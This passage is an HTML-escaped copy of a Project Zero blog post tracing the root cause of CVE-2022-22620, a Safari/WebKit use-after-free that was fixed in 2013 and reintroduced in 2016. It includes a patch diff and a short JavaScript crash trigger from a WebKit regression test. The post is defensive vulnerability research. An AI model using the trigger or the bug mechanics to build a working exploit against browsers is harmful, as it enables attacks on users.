New\"}.ZslSztaQWN-c14{color:inherit;text-decoration:inherit}.ZslSztaQWN-c22{padding:0;margin:0}.ZslSztaQWN-c26{margin-left:72pt;padding-left:0pt}.ZslSztaQWN-c20{height:11pt}.ZslSztaQWN-c15{height:0pt}.ZslSztaQWN-c37{background-color:#99ee99}.ZslSztaQWN-c40{height:11.2pt}.ZslSztaQWN-c35{height:12pt}.ZslSztaQWN-c7{height:12.8pt}.ZslSztaQWN-c39{background-color:#ee9999}.ZslSztaQWN-c41{margin-left:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"ZslSztaQWN-c43\"&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;Posted by Maddie Stone, Google Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;Whenever there&amp;rsquo;s a new in-the-wild 0-day disclosed, I&amp;rsquo;m very interested in understanding the root cause of the bug. This allows us to then understand if it was fully fixed, look for variants, and brainstorm new mitigations. This blog is the story of a &amp;ldquo;zombie&amp;rdquo; Safari 0-day and how it came back from the dead to be disclosed as exploited in-the-wild in 2022. CVE-2022-22620 was initially fixed in 2013, reintroduced in 2016, and then disclosed as exploited in-the-wild in 2022. If you&amp;rsquo;re interested in the full root cause analysis for CVE-2022-22620, we&amp;rsquo;ve published it &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22620.html\"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;In the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://googleprojectzero.blogspot.com/2021/02/deja-vu-lnerability.html\"&gt;2020 Year in Review of 0-days exploited in the wild&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;, I wrote how 25% of all 0-days detected and disclosed as exploited in-the-wild in 2020 were variants of previously disclosed vulnerabilities. Almost halfway through 2022 and it seems like we&amp;rsquo;re seeing a similar trend. Attackers don&amp;rsquo;t need novel bugs to effectively exploit users with 0-days, but instead can use vulnerabilities closely related to previously disclosed ones. This blog focuses on just one example from this year because it&amp;rsquo;s a little bit different from other variants that we&amp;rsquo;ve discussed before. Most variants we&amp;rsquo;ve discussed previously exist due to incomplete patching. But in this case, the variant was completely patched when the vulnerability was initially reported in 2013. However, the variant was reintroduced 3 years later during large refactoring efforts. The vulnerability then continued to exist for 5 years until it was fixed as an in-the-wild 0-day in January 2022.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"ZslSztaQWN-c31 ZslSztaQWN-c19\" id=\"h.73vyhrucsc6\"&gt;&lt;span class=\"ZslSztaQWN-c8 ZslSztaQWN-c6\"&gt;Getting Started&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;In the case of CVE-2022-22620 I had two pieces of information to help me figure out the vulnerability: &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/486816dc355c19f1de1b8056f85d0bbf7084dd6e\"&gt;the patch&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(thanks to Apple for sharing with me!) and &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://support.apple.com/en-us/HT213093\"&gt;the description from the security bulletin&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;stating that the vulnerability is a use-after-free. The primary change in the patch was to change the type of the second argument (&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;) to the function &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;FrameLoader::loadInSameDocument&lt;/span&gt;&lt;span&gt;&amp;nbsp;from a raw pointer, &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue*&lt;/span&gt;&lt;span&gt;&amp;nbsp;to a reference-counted pointer, &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;RefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c19 ZslSztaQWN-c45\"&gt;&lt;span class=\"ZslSztaQWN-c29\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://trac.webkit.org/changeset/288539/webkit/trunk/Source/WebCore/loader/FrameLoader.cpp\"&gt;trunk/Source/WebCore/loader/FrameLoader.cpp&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c6 ZslSztaQWN-c42\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.d2b748d06cece430655335607ebc8e7dbe422f78\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"ZslSztaQWN-c27\"&gt;&lt;tr class=\"ZslSztaQWN-c7\"&gt;&lt;td class=\"ZslSztaQWN-c30\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c18\"&gt;&lt;span class=\"ZslSztaQWN-c21 ZslSztaQWN-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ZslSztaQWN-c38\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c18\"&gt;&lt;span class=\"ZslSztaQWN-c21 ZslSztaQWN-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ZslSztaQWN-c50\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c21 ZslSztaQWN-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ZslSztaQWN-c40\"&gt;&lt;td class=\"ZslSztaQWN-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c24 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c33\"&gt;1094&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ZslSztaQWN-c48\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c24 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c33\"&gt;1094&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ZslSztaQWN-c51\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c28\"&gt;// This does the same kind of work that didOpenURL does, except it relies on the fact&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ZslSztaQWN-c40\"&gt;&lt;td class=\"ZslSztaQWN-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c24 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c33\"&gt;1095&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ZslSztaQWN-c48\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c19 ZslSztaQWN-c24\"&gt;&lt;span class=\"ZslSztaQWN-c33\"&gt;1095&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ZslSztaQWN-c44\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c28\"&gt;// that a higher level already checked that the URLs match and the scrolling is the right thing to do.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ZslSztaQWN-c35\"&gt;&lt;td class=\"ZslSztaQWN-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c24 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c33\"&gt;1096&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ZslSztaQWN-c36\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c24 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c33\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ZslSztaQWN-c34\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c28\"&gt;void FrameLoader::loadInSameDocument(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c28 ZslSztaQWN-c39\"&gt;const URL&amp;amp; url, SerializedScriptValue*&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c28\"&gt;&amp;nbsp;stateObject, bool isNewNavigation)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ZslSztaQWN-c35\"&gt;&lt;td class=\"ZslSztaQWN-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c24 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c33\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ZslSztaQWN-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c24 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c33\"&gt;1096&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ZslSztaQWN-c49\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c28\"&gt;void FrameLoader::loadInSameDocument(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c28 ZslSztaQWN-c37\"&gt;URL url, RefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c28\"&gt;&amp;nbsp;stateObject, bool isNewNavigation)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;Whenever I&amp;rsquo;m doing a root cause analysis on a browser in-the-wild 0-day, along with studying the code, I also usually search through commit history and bug trackers to see if I can find anything related. I do this to try and understand when the bug was introduced, but also to try and save time. (There&amp;rsquo;s a lot of 0-days to be studied! &amp;#x1f600;)&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"ZslSztaQWN-c31 ZslSztaQWN-c19\" id=\"h.biu13uvstqei\"&gt;&lt;span class=\"ZslSztaQWN-c8 ZslSztaQWN-c6\"&gt;The Previous Life&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;In the case of CVE-2022-22620, I was scrolling through the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://git-scm.com/docs/git-blame\"&gt;git &lt;/a&gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://git-scm.com/docs/git-blame\"&gt;blame&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;view of &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;FrameLoader.cpp&lt;/span&gt;&lt;span&gt;. Specifically I was looking at the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/blame/7b23cae2a1b1ffd026288f15261f8ba272c3b24b/Source/WebCore/loader/FrameLoader.cpp#L1096\"&gt;definition of &lt;/a&gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16 ZslSztaQWN-c47\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/blame/7b23cae2a1b1ffd026288f15261f8ba272c3b24b/Source/WebCore/loader/FrameLoader.cpp#L1096\"&gt;loadInSameDocument&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. When looking at the git blame for this line prior to our patch, it&amp;rsquo;s a &lt;/span&gt;&lt;span&gt;very &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/aa31b6b4d09b09acdf1cec11f2f7f35bd362dd0e\"&gt;interesting commit&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The commit was actually changing the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument from a reference-counted pointer, &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;PassRefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;span&gt;, to a raw pointer, &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;*&lt;/span&gt;&lt;span&gt;. This change from December 2016 introduced CVE-2022-22620. The &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/aa31b6b4d09b09acdf1cec11f2f7f35bd362dd0e#diff-9fb71b6fa7156160059b0216d05933e621d422df2b20f72ad7399eb946b8ba04\"&gt;Changelog even states&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;&lt;br&gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c25 ZslSztaQWN-c6\"&gt;(WebCore::FrameLoader::loadInSameDocument): Take a raw pointer for the&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c25 ZslSztaQWN-c6\"&gt;serialized script value state object. No one was passing ownership.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c25 ZslSztaQWN-c6\"&gt;But pass it along to statePopped as a Ref since we need to pass ownership&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c25 ZslSztaQWN-c6\"&gt;of the null value, at least for now.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;Now I was intrigued and wanted to track down the previous commit that had changed the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument to &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;PassRefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;span&gt;. I was in luck and only had to go &lt;/span&gt;&lt;span&gt;back in the history two more steps&lt;/span&gt;&lt;span&gt;. There was a &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://github.com/WebKit/WebKit/commit/4b3be1d3a8d22cb2b2f5ddb8299f7cd25a21cebf\"&gt;commit from 2013&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;that changed the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;stateObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument from the raw pointer, &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue*&lt;/span&gt;&lt;span&gt;, to a reference-counted pointer, &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;PassRefPtr&amp;lt;SerializedScriptValue&amp;gt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;. This commit from February 2013 was doing the same thing that our commit in 2022 was doing. The commit was titled &amp;ldquo;Use-after-free in SerializedScriptValue::deserialize&amp;rdquo; and included a good description of how that use-after-free worked.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;The commit also included a test:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c6 ZslSztaQWN-c25\"&gt;Added a test that demonstrated a crash due to use-after-free&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c25 ZslSztaQWN-c6\"&gt;of SerializedScriptValue.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c25 ZslSztaQWN-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c19 ZslSztaQWN-c52\"&gt;&lt;span class=\"ZslSztaQWN-c25 ZslSztaQWN-c6\"&gt;Test: fast/history/replacestate-nocrash.html&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;The trigger from this test is:&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.bea0338a691e658fe5342eccc78ecfb67c0fd560\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"ZslSztaQWN-c27\"&gt;&lt;tr class=\"ZslSztaQWN-c15\"&gt;&lt;td class=\"ZslSztaQWN-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c1\"&gt;Object&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;prototype&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;__defineSetter__&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;foo&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c46\"&gt;function&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(){&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;history&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;replaceState&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;)});&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;history&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;replaceState&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;({&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;foo&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;:&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c3\"&gt;1&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;,&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;zzz&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;:&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;repeat&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;(&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c3\"&gt;1&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c3\"&gt;22&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;)},&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c17\"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12\"&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;history&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;state&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;.&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c0\"&gt;length&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;My hope was that the test would crash the vulnerable version of WebKit and I&amp;rsquo;d be done with my root cause analysis and could move on to the next bug. Unfortunately, it didn&amp;rsquo;t crash.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;The commit description included the comment to check out a Chromium bug. (During this time Chromium still used the WebKit rendering engine. Chromium forked&lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://blog.chromium.org/2013/04/blink-rendering-engine-for-chromium.html\"&gt;&amp;nbsp;the Blink rendering engine in April 2013&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.) &lt;/span&gt;&lt;span&gt;I saw that my now Project Zero teammate, Sergei Glazunov, originally reported the &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c16\"&gt;&lt;a class=\"ZslSztaQWN-c141\" href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=171839\"&gt;Chromium bug&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;back in 2013&lt;/span&gt;&lt;span&gt;, so I asked him for the details.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span class=\"ZslSztaQWN-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c12 ZslSztaQWN-c19\"&gt;&lt;span&gt;The use-after-free from 2013 (&lt;/span&gt;&lt;span&gt;no CVE was assigned&lt;/span&gt;&lt;span&gt;) &lt;/span&gt;&lt;span&gt;was&lt;/span&gt;&lt;span&gt;&amp;nbsp;a bug in the implementation of the History API. This API allows access to (and modification of) a stack of the pages visited in the current frame, and these page states are stored as a &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue&lt;/span&gt;&lt;span&gt;. The History API exposes a getter for &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;state&lt;/span&gt;&lt;span&gt;, and a method &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;replaceState&lt;/span&gt;&lt;span&gt;&amp;nbsp;which allows overwriting the &amp;quot;most recent&amp;quot; history entry. &lt;br&gt;&lt;br&gt;The bug was that in the implementation of the getter for &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;state&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue::deserialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;was called on the current &amp;quot;most recent&amp;quot; history entry value without increasing its reference count. As &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue::deserialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;could trigger a callback into user JavaScript, the callback could call &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;replaceState&lt;/span&gt;&lt;span&gt;&amp;nbsp;to drop the only reference to the history entry value by replacing it with a new value. When the callback returned, the rest of &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;SerializedScriptValue::deserialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;ran with a free&amp;#39;d &lt;/span&gt;&lt;span class=\"ZslSztaQWN-c4\"&gt;this&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ZslSztaQWN-c11\"&gt;&lt;span 